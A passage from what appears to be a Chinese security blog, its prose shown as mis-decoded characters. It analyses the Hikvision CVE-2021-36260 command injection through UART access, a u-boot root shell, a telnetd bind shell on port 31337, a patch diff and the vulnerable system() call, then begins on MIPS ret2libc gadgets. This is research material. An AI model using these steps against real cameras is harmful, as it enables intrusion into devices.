<h2 id="è·å–å›ºä»¶"><a href="#è·å–å›ºä»¶" class="headerlink" title="è·å–å›ºä»¶"></a>è·å–å›ºä»¶</h2><p>æ ¹æ®æŠ«éœ²ä¿¡æ¯ï¼Œå»æµ·åº·å¨è§†æ¬§æ´²åŒºåŸŸç½‘ç«™ä¸‹è½½è®¾å¤‡å›ºä»¶ï¼Œç”±äºæ­¤æ¼æ´å½±å“ä¸åŒå‹å·è®¾å¤‡ï¼Œæˆ‘ä»¬é€‰æ‹© DS-2CD1x10 ç³»åˆ—è¿›è¡Œæµ‹è¯•ï¼Œ<a class="link"   href="https://www.hikvisioneurope.com/eu/portal/portal/Technical%20Materials/00%20%20Network%20Camera/00%20%20Product%20Firmware/R2%20platform%20%28DS-2CD1x10%2C1X02%2C1X21%2C2xx0%2C2X14%2C4xx0%2C%20mobile%20IPC%29/V5.4.81_Build180203%28Released%29except%20mobile%20IPC/IPC_R2_EN_STD_V5.4.81_Build180203.zip" >ç‚¹æ­¤ä¸‹è½½å›ºä»¶<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚</p>
<p>æ‹¿åˆ°å›ºä»¶å binwalk ç›´æ¥è§£åŒ…ï¼Œå¾—åˆ°ä¸€ä¸ª linux rootfsï¼Œä»¥åŠä¸€ä¸ª cramfs åˆ†åŒºæ•°æ®ã€‚(PSï¼šæŸäº›ç‰ˆæœ¬çš„å…¬å¼€å›ºä»¶å¯èƒ½æ˜¯åŠ å¯†çš„ï¼Œéœ€è¦è¯»å– flash èŠ¯ç‰‡æ•°æ®)</p>
<p>å°½ç®¡èƒ½å¤ŸæˆåŠŸè§£å¼€å›ºä»¶ï¼Œä½†æ˜¯åœ¨è§£åŒ…çš„æ–‡ä»¶ç³»ç»Ÿä¸­æ²¡æœ‰æ‰¾åˆ°ç±»ä¼¼ httpd ç­‰å…³é”®ç¨‹åºã€‚åœ¨ cramfs åˆ†åŒºä¸­å­˜åœ¨ä¸€äº›å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªå«åš davinci_bak çš„æ–‡ä»¶æ—¢ä¸æ˜¯å¯æ‰§è¡Œç¨‹åºï¼Œä¹Ÿä¸æ˜¯é…ç½®æ–‡ä»¶ï¼Œä¸”é€šè¿‡ binwalk æŸ¥çœ‹ç†µå€¼å‘ç°æ–‡ä»¶ä¼¼ä¹ç»è¿‡åŠ å¯†ã€‚</p>
<p>æœç´¢ davinci_bak åœ¨ daemon_fsp_app æ–‡ä»¶ä¸­æ‰¾åˆ°ç›¸å…³ä¿¡æ¯ï¼Œæ­¤ç¨‹åºä» &#x2F;dev&#x2F;hikio è®¾å¤‡æ–‡ä»¶ä¸­è¯»å–å¯†é’¥ï¼Œç„¶ååˆ©ç”¨ OpenSSL å¯¹ davinci_bak è¿›è¡Œ AES è§£å¯†ï¼ŒçŒœæµ‹æ­¤æ–‡ä»¶å†…åŒ…å«ä¸»è¦é€»è¾‘ã€‚</p>
<h2 id="ä¸²å£è°ƒè¯•"><a href="#ä¸²å£è°ƒè¯•" class="headerlink" title="ä¸²å£è°ƒè¯•"></a>ä¸²å£è°ƒè¯•</h2><p>ä»æœ¬åœ°å›ºä»¶ä¸­æ— æ³•å¾—åˆ° AES å¯†é’¥ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°è¯•ä»çœŸæœºä¸Šæå–ä¸»ç¨‹åºã€‚</p>
<p>æ‹†è§£æœºå™¨ï¼Œåœ¨ä¸»æ¿ä¸Šæ‰¾åˆ°äº†é¢„ç•™çš„ UART è°ƒè¯•æ¥å£ï¼Œç„Šæ¥å¤„ç†ä¹‹åå³å¯ä½¿ç”¨ FT232 è°ƒè¯•ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2021-36260-1.jpg"
                     
                ></p>
<p>æ¥å¥½çº¿è·¯å°†ä¸²å£å·¥å…·æ¥å…¥ç”µè„‘ï¼Œè®¾ç½®æ³¢ç‰¹ç‡ä¸º 115200ï¼Œä¸Šç”µå¼€æœºçœ‹åˆ°ä¸²å£æœ‰æ•°æ®è¾“å‡ºã€‚</p>
<p>ç­‰å¾…ç³»ç»Ÿæ­£å¸¸å¯åŠ¨ï¼Œå‘ç°è¾“å‡ºäº†å‘½ä»¤æç¤ºç¬¦ï¼Œä½†æ˜¯è®¸å¤š linux å‘½ä»¤éƒ½æ— æ³•ä½¿ç”¨ï¼Œps çœ‹åˆ°ç›®å‰æˆ‘ä»¬æ“ä½œçš„æ˜¯ &#x2F;bin&#x2F;psh ç¨‹åºï¼Œæ­¤ç¨‹åºä¸ºæµ·åº·å¨è§†ç¼–å†™çš„ protect-shellï¼Œç¦ç”¨äº†å¤§éƒ¨åˆ†ç³»ç»ŸåŠŸèƒ½ã€‚</p>
<h2 id="è·å–-root-shell"><a href="#è·å–-root-shell" class="headerlink" title="è·å– root shell"></a>è·å– root shell</h2><p>ä¸ºäº†æ–¹ä¾¿åç»­çš„æ“ä½œï¼Œæˆ‘ä»¬éœ€è¦è·å–å®Œæ•´çš„ shellï¼Œé€šè¿‡åœ¨ç½‘ç»œä¸Šæ£€ç´¢ä¿¡æ¯ï¼Œæ‰¾åˆ° ipcamtalk è®ºå›<a class="link"   href="https://ipcamtalk.com/threads/long-shot-help-request-hikvision-ds-2cd3335d-g0-series-ipc.21775/page-2" >ä¸€ç¯‡å¸–å­<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œå…¶ä¸­æåˆ°äº†å¯ä»¥é€šè¿‡ä¿®æ”¹ u-boot å¯åŠ¨å‚æ•°çš„æ–¹å¼æ¥è·å–å®Œæ•´ shellã€‚</p>
<p>é‡å¯è®¾å¤‡ï¼Œå½“ä¸²å£æç¤º â€œHit Ctrl+u to stop autoboot:â€ æ—¶æŒ‰ä¸‹ Ctrl + u è¿›å…¥ u-boot å‘½ä»¤è¡Œï¼Œè¾“å…¥ help çœ‹åˆ°å¸®åŠ©ä¿¡æ¯ã€‚</p>
<p>ç”¨ â€œsetenv bootargs console&#x3D;ttyS0,115200 root&#x3D;&#x2F;dev&#x2F;ram0 mem&#x3D;61M dbg&#x3D;9 debug singleâ€ å‘½ä»¤æ¥ä¿®æ”¹ bootargs ç¯å¢ƒå˜é‡ï¼Œâ€œsaveenvâ€ ä¿å­˜ä¿®æ”¹ï¼Œâ€œresetâ€ é‡å¯è®¾å¤‡ï¼Œç­‰å¾…è®¾å¤‡å¯åŠ¨åå³å¯å¾—åˆ°å®Œæ•´çš„ shellã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2021-36260-2.png"
                     
                ></p>
<p>ä¸è¿‡ç”±äºæˆ‘ä»¬ä¿®æ”¹äº†å¯åŠ¨è¿›ç¨‹ï¼Œå¯¼è‡´ç›®å‰ç³»ç»Ÿè¿˜æœªåˆå§‹åŒ–ï¼Œå…¶ä¸­çš„å…³é”®ç¨‹åºæ²¡æœ‰å¯åŠ¨ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åºåˆ—å®Œæˆè®¾å¤‡åˆå§‹åŒ–å¹¶ä¿ç•™ root shellã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm /bin/psh</span><br><span class="line">echo &quot;#!/bin/bash&quot; &gt; /bin/psh</span><br><span class="line">echo &quot;/bin/bash&quot; &gt;&gt; /bin/psh</span><br><span class="line">chmod +x /bin/psh    # å°† psh æ›¿æ¢ä¸ºå®Œæ•´çš„ bash</span><br><span class="line">./linuxrc    # æ‰§è¡Œç³»ç»Ÿåˆå§‹åŒ–è„šæœ¬</span><br></pre></td></tr></table></figure></div>

<h2 id="æŒ‚è½½-nfs"><a href="#æŒ‚è½½-nfs" class="headerlink" title="æŒ‚è½½ nfs"></a>æŒ‚è½½ nfs</h2><p>è®¾å¤‡è‡ªå¸¦çš„ busybox ç»è¿‡å¤§å¹…åº¦è£å‰ªï¼Œç¼ºå°‘ curlã€wget ç­‰å‘è®¾å¤‡ä¼ è¾“æ–‡ä»¶çš„åŠŸèƒ½ï¼Œå¯¼è‡´åç»­æµ‹è¯•å›°éš¾ã€‚æˆ‘ä»¬è€ƒè™‘ç”¨ nfs å®ç°æ–‡ä»¶ä¼ è¾“ï¼Œåœ¨æ‘„åƒå¤´ä¸Šåˆ©ç”¨ mount å‘½ä»¤æŒ‚è½½å¤–éƒ¨è®¾å¤‡çš„ nfs æ–‡ä»¶ç³»ç»Ÿåˆ°æœ¬åœ°ã€‚</p>
<p>é¦–å…ˆå‡†å¤‡ä¸€ä»½å®Œæ•´çš„ <a class="link"   href="https://busybox.net/downloads/binaries/1.19.0/" >busybox<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œåœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ª nfs æœåŠ¡å™¨ï¼Œè®¾å¤‡ä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /tmp/hik</span><br><span class="line">busybox mount -o nolock -t nfs 192.168.0.160:/home/iot/Desktop/hik /tmp/hik</span><br><span class="line">chmod 777 /tmp/hik/busybox-armv5l</span><br><span class="line">/tmp/hik/busybox-armv5l telnetd -l/bin/sh -p31337 &amp;</span><br></pre></td></tr></table></figure></div>

<p>æ‰§è¡Œåå³å¯è¿æ¥è®¾å¤‡ 31337 ç«¯å£å¾—åˆ° shellï¼Œé˜²æ­¢ä¸²å£è¾“å‡ºçš„å…¶å®ƒä¿¡æ¯å¹²æ‰°åˆ†æã€‚</p>
<h2 id="è¡¥ä¸å¯¹æ¯”"><a href="#è¡¥ä¸å¯¹æ¯”" class="headerlink" title="è¡¥ä¸å¯¹æ¯”"></a>è¡¥ä¸å¯¹æ¯”</h2><p>åœ¨ &#x2F;home&#x2F;process ç›®å½•ä¸‹æ‰¾åˆ°è§£å¯†å®Œæˆçš„ davinci ç¨‹åºï¼Œå°†å®ƒæ‹·è´å› nfs ç›®å½•</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /home/process/davinci /tmp/hik</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·åœ¨ nfs æœåŠ¡å™¨ç«¯å°±èƒ½ä¸‹è½½åˆ°æ­¤ç¨‹åºã€‚</p>
<p>åŒæ ·çš„æ“ä½œæˆ‘ä»¬è§£åŒ…å‡ºä¿®å¤å‰å’Œä¿®å¤åçš„ä¸¤ä¸ª davinci ç¨‹åºï¼Œç”¨ bindiff è¿›è¡Œè¡¥ä¸å¯¹æ¯”ï¼Œå¾—åˆ°çš„ç»“æœä¸­æ¶‰åŠä¸€ä¸ªå«åš hwif_is_all_language_character_legal çš„å‡½æ•°ï¼Œä¸¤ä¸ªç‰ˆæœ¬å‡½æ•°å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// OLD Version</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">hwif_is_all_language_character_legal</span><span class="params">(<span class="type">char</span> *filename, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v3; <span class="comment">// r4</span></span><br><span class="line">    <span class="type">size_t</span> filename_len; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">size_t</span> v5; <span class="comment">// r5</span></span><br><span class="line">    <span class="type">char</span> *v6; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">char</span> *filtered_filename; <span class="comment">// r6</span></span><br><span class="line">    <span class="type">char</span> *tmp_buf; <span class="comment">// r2</span></span><br><span class="line">    <span class="type">size_t</span> i; <span class="comment">// r3</span></span><br><span class="line">    <span class="type">int</span> v10; <span class="comment">// r1</span></span><br><span class="line">    <span class="type">char</span> v11; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">bool</span> v12; <span class="comment">// zf</span></span><br><span class="line">    <span class="type">size_t</span> v13; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">size_t</span> v14; <span class="comment">// r2</span></span><br><span class="line"></span><br><span class="line">    v3 = a2;</span><br><span class="line">    <span class="keyword">if</span> ( !filename )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    &#123;</span><br><span class="line">        dev_debug_v1(<span class="number">2</span>, <span class="number">48</span>, <span class="string">&quot;basefun_lib/string/string_deal.c&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">    filename_len = <span class="built_in">strlen</span>(filename);</span><br><span class="line">    v5 = filename_len;</span><br><span class="line">    <span class="keyword">if</span> ( filename_len != v3 || (v6 = <span class="built_in">calloc</span>(<span class="number">1u</span>, filename_len + <span class="number">1</span>), (filtered_filename = v6) == <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        LABEL_5:</span><br><span class="line">        dev_debug_v1(<span class="number">2</span>, <span class="number">48</span>, <span class="string">&quot;basefun_lib/string/string_deal.c&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tmp_buf = v6;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        v10 = filename[i];</span><br><span class="line">        v11 = filename[i];</span><br><span class="line">        v12 = v10 == <span class="string">&#x27;`&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v10 != <span class="string">&#x27;`&#x27;</span> )</span><br><span class="line">            v12 = v10 == <span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v12 )</span><br><span class="line">            *tmp_buf++ = v11;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    *tmp_buf = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(filename, <span class="number">0</span>, v5);</span><br><span class="line">    v13 = <span class="built_in">strlen</span>(filtered_filename);</span><br><span class="line">    <span class="keyword">if</span> ( v13 &gt;= v5 )</span><br><span class="line">        v14 = v5;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        v14 = v13;</span><br><span class="line">    <span class="built_in">memcpy</span>(filename, filtered_filename, v14);</span><br><span class="line">    <span class="built_in">free</span>(filtered_filename);</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// NEW Version</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">hwif_is_all_language_character_legal</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// r3</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 v3; <span class="comment">// r12</span></span><br><span class="line">    <span class="type">bool</span> v4; <span class="comment">// cc</span></span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( a1 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = *(a1 + i);</span><br><span class="line">            v4 = v3 - <span class="number">48</span> &gt; <span class="number">9</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v3 - <span class="number">48</span> &gt; <span class="number">9</span> )</span><br><span class="line">                v4 = v3 - <span class="number">97</span> &gt; <span class="number">25</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v4 &amp;&amp; v3 - <span class="number">65</span> &gt; <span class="number">25</span> &amp;&amp; v3 != <span class="number">45</span> &amp;&amp; v3 != <span class="number">95</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        &#125;</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        dev_debug_v1(</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">38</span>,</span><br><span class="line">            <span class="string">&quot;hardwareif/r2/unihardwareif.c&quot;</span>,</span><br><span class="line">            <span class="number">402</span>,</span><br><span class="line">            <span class="string">&quot;hwif_is_all_language_character_legal&quot;</span>,</span><br><span class="line">            <span class="string">&quot;p_str is NULL.\n&quot;</span>);</span><br><span class="line">        LABEL_11:</span><br><span class="line">        result = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ—§ç‰ˆæœ¬åªæ£€æŸ¥äº†å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å« &#96;;ï¼Œè€Œæ–°ç‰ˆä¸­é™åˆ¶å­—ç¬¦ä¸²æ˜¯çº¯æ•°å­—&#x2F;å­—æ¯ç»„æˆã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>é€šè¿‡äº¤å‰å¼•ç”¨ hwif_is_all_language_character_legal å‡½æ•°å®šä½åˆ°æ¼æ´çš„å…·ä½“ä½ç½®</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> ( hwif_is_all_language_character_legal(a1, v3) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_13;</span><br><span class="line"><span class="built_in">snprintf</span>(s, <span class="number">0x1F</span>u, <span class="string">&quot;%s%s&quot;</span>, <span class="string">&quot;/home/webLib/doc/i18n/&quot;</span>, a1);</span><br><span class="line"><span class="keyword">if</span> ( !check_is_file_exist(s) )</span><br><span class="line">&#123;</span><br><span class="line">    dev_debug_v1(<span class="number">5</span>, <span class="number">38</span>, <span class="string">&quot;hardwareif/r2/unihardwareif.c&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line"><span class="built_in">snprintf</span>(s, <span class="number">0x1F</span>u, <span class="string">&quot;/dav/IElang.tar %s.tar.gz&quot;</span>, a1);</span><br><span class="line"><span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line"><span class="built_in">snprintf</span>(</span><br><span class="line">    v5,</span><br><span class="line">    <span class="number">0xFF</span>u,</span><br><span class="line">    <span class="string">&quot;tar -xf %s -C %s; tar -zxf %s%s.tar.gz -C %s&quot;</span>,</span><br><span class="line">    s,</span><br><span class="line">    <span class="string">&quot;/home/webLib/doc/i18n/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/home/webLib/doc/i18n/&quot;</span>,</span><br><span class="line">    a1,</span><br><span class="line">    <span class="string">&quot;/home/webLib/doc/i18n/&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( system(v5) &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‚æ•° a1 ç»è¿‡ hwif_is_all_language_character_legal è¿‡æ»¤ä¹‹åä¼šå°†å…¶ä½œä¸ºæ–‡ä»¶åæ£€æŸ¥ç›®æ ‡æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™å°† a1 æ‹¼æ¥åˆ° tar å‘½ä»¤ä¸­ç›´æ¥å¸¦å…¥ system å‡½æ•°æ‰§è¡Œï¼Œæ˜¾ç„¶å­˜åœ¨å‘½ä»¤æ³¨å…¥ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>MIPS ROP-system parameter issue</title>
    <url>/2021/09/17/mipsrop/</url>
    <content><![CDATA[<p>MIPS æ¶æ„ä¸‹çš„æ ˆæº¢å‡ºå®‰å…¨ç¼ºé™· exploit - system å‡½æ•°å‚æ•°è¦†ç›–é—®é¢˜ã€‚</p>
<span id="more"></span>

<h2 id="å¸¸è§çš„-MIPS-ä¸‹å®‰å…¨ç¼ºé™·åˆ©ç”¨æ–¹å¼"><a href="#å¸¸è§çš„-MIPS-ä¸‹å®‰å…¨ç¼ºé™·åˆ©ç”¨æ–¹å¼" class="headerlink" title="å¸¸è§çš„ MIPS ä¸‹å®‰å…¨ç¼ºé™·åˆ©ç”¨æ–¹å¼"></a>å¸¸è§çš„ MIPS ä¸‹å®‰å…¨ç¼ºé™·åˆ©ç”¨æ–¹å¼</h2><p>MIPS æ¶æ„ä¸‹çš„æ ˆæº¢å‡º exploit é€šå¸¸ä¼šä½¿ç”¨ ret2shellcodeã€ret2textã€ret2libc ä¸‰ç§æ–¹å¼ã€‚</p>
<p><strong>ret2shellcode</strong></p>
<p>MIPS æŒ‡ä»¤é›†ä¸­å­˜åœ¨ä¸€ç±»ç‰¹æ®Šçš„ gadgetï¼Œå®ƒä»¬å¯ä»¥é€šè¿‡ $sp å¯„å­˜å™¨å¯»å€ï¼Œå°†æ ˆåœ°å€($sp + offset)åŠ è½½åˆ°æŸå¯„å­˜å™¨ä¸­ï¼Œç„¶åè·³è½¬åˆ°è¯¥å¯„å­˜å™¨æ‰§è¡Œã€‚å¦å¤–ï¼ŒMIPS æ¶æ„ä¸‹ä»…æœ‰å—é™çš„ no-execute ä¿æŠ¤[1]ï¼Œæ ¹æ® MIPS å®˜æ–¹æ–‡æ¡£[2]æè¿°ï¼Œåªæœ‰åœ¨ MIPS Release 3 ä»¥åŠ SmartMIPS ASE ä¸­åŒ…å«ç±»ä¼¼ no-execute çš„ XI(Execute Inhibit) ä¿æŠ¤ï¼Œè€Œå¤§é‡é‡‡ç”¨ MIPS CPU çš„è®¾å¤‡ä¸­ï¼Œstack å†…å­˜åŒºåŸŸé€šå¸¸åŒ…å« rwx æƒé™ã€‚</p>
<p>åŸºäºä»¥ä¸Šä¸¤ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥å°† shellcode å¸ƒç½®äº stackï¼Œç„¶ååˆ©ç”¨æ­¤ç±» gadget è·³è½¬åˆ° shellcode æ‰§è¡Œã€‚</p>
<p><strong>ret2text</strong></p>
<p>æŸäº›æƒ…å†µä¸‹åŒ…å«å®‰å…¨ç¼ºé™·çš„ç›®æ ‡ç¨‹åºä¸­å«æœ‰æ¯”è¾ƒæœ‰ç”¨çš„ä»£ç ç‰‡æ®µï¼Œä¾‹å¦‚ç¨‹åºä¸­åŒ…å«è°ƒç”¨ system å‡½æ•°çš„é€»è¾‘ï¼Œæ­¤æ—¶å¯é€šè¿‡ ret2text è¿”å›åˆ°ç¨‹åºå†…éƒ¨çš„ system å‡½æ•°æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p><strong>ret2libc</strong></p>
<p>ä»¥ä¸Šä¸¤ç§æ–¹å¼åŸºæœ¬éƒ½éœ€è¦å¤šæ¬¡æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ï¼Œç„¶è€Œåœ¨å®é™…æƒ…å†µä¸‹ï¼Œå¾ˆå¤šåŒ…å«å®‰å…¨ç¼ºé™·çš„ç¨‹åºå¯¹äºç”¨æˆ·æäº¤çš„æ•°æ®æœ‰é™åˆ¶ï¼Œä¾‹å¦‚ \x00 åœ¨ web æœåŠ¡ä¸­ä¼šæˆªæ–­å…¶åçš„æ•°æ®ï¼Œå¯¼è‡´è¯·æ±‚ä¸å®Œæ•´ã€‚æ­¤ç±»æƒ…å†µä¸‹ä¼šè€ƒè™‘å°†ç¨‹åºæ‰§è¡ŒæµåŠ«æŒåˆ° libc ä¸­ï¼Œå› ä¸º libc åœ°å€è¾ƒé«˜ï¼Œä¸ä¼šåŒ…å« \x00 ç­‰åå­—èŠ‚ã€‚ret2libc çš„ä¸€ç§ç»å…¸æ€è·¯æ˜¯å°†å‘½ä»¤ä¿å­˜åˆ° stackï¼Œç„¶åé€šè¿‡ ROP å°† stack åœ°å€åŠ è½½è‡³ $a0 å¯„å­˜å™¨ï¼Œæœ€åè·³è½¬åˆ° libc ä¸­çš„ system å‡½æ•°æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>ä»¥ä¸Šæ˜¯ MIPS æ¶æ„ä¸­æ¯”è¾ƒå¸¸ç”¨çš„å®‰å…¨ç¼ºé™·åˆ©ç”¨æ–¹å¼ï¼Œæœ€ç»ˆè¾¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç›®çš„(è¯¦ç»†æ€è·¯å¯å‚è€ƒäº’è”ç½‘æ–‡ç« )ã€‚</p>
<h2 id="system-å‚æ•°è¦†ç›–é—®é¢˜"><a href="#system-å‚æ•°è¦†ç›–é—®é¢˜" class="headerlink" title="system å‚æ•°è¦†ç›–é—®é¢˜"></a>system å‚æ•°è¦†ç›–é—®é¢˜</h2><p>ä¸‹é¢ç®€å•è¯´æ˜ä»€ä¹ˆæ˜¯ system å‚æ•°è¦†ç›–ä»¥åŠè¿™ä¸ªé—®é¢˜æ˜¯å¦‚ä½•å‡ºç°çš„ã€‚</p>
<p>å‡è®¾ä¸€ç½‘ç»œè®¾å¤‡çš„ web æœåŠ¡ä¸­åŒ…å«ä¸€ä¸ªæ ˆæº¢å‡ºå®‰å…¨ç¼ºé™·ï¼Œå½“ç”¨æˆ·å‘é€çš„è¯·æ±‚ä¸­ URI éƒ¨åˆ†è¿‡é•¿ï¼Œä¼šå¯¼è‡´ç¨‹åºå‘æ ˆç¼“å†²åŒºæ‹·è´è¿‡å¤šçš„æ•°æ®ï¼Œä½¿ç¨‹åºå´©æºƒã€‚</p>
<p>æŒ‰ç…§ç»å…¸çš„ exploit æ€è·¯ï¼Œè¿™é‡Œå¯ä»¥é‡‡ç”¨ ret2libc æ–¹å¼ï¼Œå…ˆç”¨ mipsrop å·¥å…·ä» libc ä¸­æŸ¥æ‰¾åˆé€‚çš„ gadget</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">|  0x000518D0  |  addiu $a0,$sp,24 ; jr    68($sp)</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬çœ‹åˆ°ä½äº 0x518D0 ä½ç½®çš„ gadget æ¯”è¾ƒåˆé€‚ï¼Œå®ƒå°† $sp + 24 åœ°å€åŠ è½½åˆ° $a0ï¼Œç„¶åè·³è½¬åˆ° $sp + 68 æŒ‡å‘çš„åœ°å€ç»§ç»­æ‰§è¡Œã€‚</p>
<p>æ‰€ä»¥å¯è¿›è¡Œå¦‚ä¸‹å†…å­˜å¸ƒå±€ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/mipsrop-1.png"
                     
                ></p>
<p>padding éƒ¨åˆ†å¡«å……æ ˆç©ºé—´æ•°æ®ï¼Œgadget_address(libc_address + 0x000518D0)è¦†ç›–äº†è¿”å›åœ°å€ï¼Œå½“ç¨‹åºä»åŒ…å«å®‰å…¨ç¼ºé™·çš„å‡½æ•°è¿”å›æ—¶ï¼Œç”±äºæ­¤å‡½æ•°ä¸ºéå¶å­å‡½æ•°ï¼Œæ‰€ä»¥ä¼šä»æ ˆä¸Šè·å–è¿”å›åœ°å€åŠ è½½åˆ° $raï¼Œè€Œè¿”å›åœ°å€å·²ç»è¢«æˆ‘ä»¬ä¿®æ”¹ä¸º gadgetï¼Œæ‰€ä»¥ç¨‹åºè·³è½¬åˆ° gadget ç»§ç»­æ‰§è¡Œã€‚</p>
<p>è¿™æ®µ gadget å…·ä½“çš„æ±‡ç¼–ä»£ç åºåˆ—å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">addiu   $a0, $sp, 24</span><br><span class="line">lw      $ra, 68($sp)</span><br><span class="line">lw      $s3, 64($sp)</span><br><span class="line">lw      $s2, 60($sp)</span><br><span class="line">lw      $s1, 56($sp)</span><br><span class="line">lw      $s0, 52($sp)</span><br><span class="line">jr      $ra</span><br><span class="line">addiu   $sp, 72</span><br></pre></td></tr></table></figure></div>

